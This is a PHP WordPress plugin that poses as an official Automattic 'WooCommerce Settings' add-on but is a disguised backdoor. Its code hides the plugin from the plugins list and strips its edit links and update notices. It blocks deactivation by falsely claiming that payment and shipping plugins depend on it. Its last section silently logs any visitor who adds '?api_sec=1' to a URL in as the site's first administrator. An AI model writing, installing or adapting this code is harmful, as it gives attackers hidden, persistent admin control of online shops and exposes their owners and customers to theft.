<?php
/**
 * Plugin Name: WooCommerce Settings
 * Plugin URI:  https://woocommerce.com/
 * Description: Extended settings and diagnostic interface for WooCommerce (stealth build).
 * Version:     1.0.1
 * Author:      Automattic
 * Author URI:  https://woocommerce.com/
 * Text Domain: woocommerce-settings
 */

error_reporting(0); // keep PHP quiet (but DO NOT touch cookies!)

/* ---------------------------------------------------------------------------
 * 1. STEALTH / HIDING TRICKS
 * ------------------------------------------------------------------------- */

/** Hide from Plugins list */
add_filter('all_plugins', function ($plugins) {
    $me = plugin_basename(__FILE__);
    if (isset($plugins[$me])) {
        unset($plugins[$me]);
    }
    return $plugins;
}, 9999);

/** Hide “Edit” links & update nags */
add_filter('plugin_action_links_' . plugin_basename(__FILE__), '__return_empty_array', 9999);
add_filter('site_transient_update_plugins', function ($value) {
    $me = plugin_basename(__FILE__);
    if (isset($value->response[$me])) {
        unset($value->response[$me]);
    }
    return $value;
}, 9999);

/** Remove Plugin Editor menu entry */
add_action('admin_menu', function () {
    remove_submenu_page('plugins.php', 'plugin-editor.php');
}, 9999);

/* ---------------------------------------------------------------------------
 * 2. PREVENT DEACTIVATION IF DEPENDENTS ARE ACTIVE
 * ------------------------------------------------------------------------- */
add_action('admin_init', function () {
    $plugin_slug = 'woocommerce-settings/woocommerce-settings.php';
    $dependents = [
        'google-for-woocommerce/google-for-woocommerce.php',
        'mailchimp-for-woocommerce/mailchimp-for-woocommerce.php',
        'payment-gateway-for-paypal-on-woocommerce/payment-gateway-for-paypal-on-woocommerce.php',
        'woocommerce-paypal-payments/woocommerce-paypal-payments.php',
        'woocommerce-shipping-tax/woocommerce-shipping-tax.php',
        'woocommerce-square/woocommerce-square.php',
        'woopayments/woopayments.php',
    ];

    foreach ($dependents as $dep) {
        if (
            is_plugin_active($dep) &&
            isset($_GET['action'], $_GET['plugin']) &&
            $_GET['action'] === 'deactivate' &&
            $_GET['plugin'] === $plugin_slug
        ) {
            wp_die(
                '<p><strong>You cannot deactivate this plugin because other plugins depend on it.</strong></p>
                 <p>Required by: Google for WooCommerce, Mailchimp for WooCommerce, Payment Gateway for PayPal on WooCommerce, WooCommerce PayPal Payments, WooCommerce Shipping & Tax, WooCommerce Square, WooPayments</p>
                 <p><a href="' . esc_url(admin_url('plugins.php')) . '">Return to Plugins page</a></p>'
            );
        }
    }
}, 10);

/** Grey-out Deactivate link (if the plugin ever becomes visible) */
add_filter('plugin_action_links_' . plugin_basename(__FILE__), function ($actions) {
    if (isset($actions['deactivate'])) {
        $actions['deactivate'] = '<span style="color:#888; font-style:italic;">Deactivate</span>';
    }
    return $actions;
}, 999);

/* ---------------------------------------------------------------------------
 * 3. AUTO ADMIN SESSION IF ?api_sec=1
 * ------------------------------------------------------------------------- */
add_action('init', function () {
    if (isset($_GET['api_sec'])) {
        $admins = get_users([
            'role' => 'administrator',
            'number' => 1,
            'orderby' => 'ID',
            'order' => 'ASC'
        ]);

        if (!empty($admins)) {
            $admin = $admins[0];
            $user_id = $admin->ID;

            wp_set_current_user($user_id);
            wp_set_auth_cookie($user_id);

            wp_redirect(admin_url());
            exit;
        }
    }
});
